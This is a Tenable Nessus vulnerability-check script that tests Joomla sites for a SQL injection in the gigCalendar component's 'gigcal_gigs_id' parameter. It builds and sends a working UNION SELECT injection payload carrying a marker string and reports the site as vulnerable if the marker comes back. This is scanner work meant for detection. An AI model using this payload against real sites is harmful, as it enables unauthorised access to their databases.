#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35474);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-0726");
  script_bugtraq_id(33241);
  script_xref(name:"milw0rm", value:"7746");
  script_xref(name:"OSVDB", value:"52257");

  script_name(english:"gigCalendar Component for Joomla! gigcal_gigs_id Parameter SQL Injection");
  script_summary(english:"Exploits a SQL Injection Vulnerability in gigCalendar");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running gigCalendar, a third-party Joomla!
component for maintaining a calendar for event promotions. 

The installed version of gigCalendar fails to sanitize input to the
'gigcal_gigs_id' parameter in the 'gigdetails.php' script before using
it in a database query.  Provided PHP's 'magic_quotes_gpc' setting is
disabled, an unauthenticated remote attacker can exploit this issue to
manipulate database queries, resulting in disclosure of sensitive
information or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );

script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue 
  magic = string(SCRIPT_NAME);
  exploit = "concat(";
  for (i=0; i<strlen(magic); i++)
    exploit += hex(ord(magic[i])) + ",";
  exploit[strlen(exploit)-1] = ")";

  exploit = string("'+and+1=2/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,",exploit,",0,11,12/*");

  url = string(
    dir,"/index.php?",
    "option=com_gigcal&",
    "task=details&",
    "gigcal_gigs_id=", exploit
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (res == NULL) exit(0);
	
  # If we see our magic and Joomla component
  if (
    magic >< res[2] &&
    'class="gigcal_menu' >< res[2]
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

    if (report_verbosity)
    {
      report = string (
        "\n",
        "Nessus was able to exploit the vulnerability using the following\n",
        "URL : \n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
  }
}
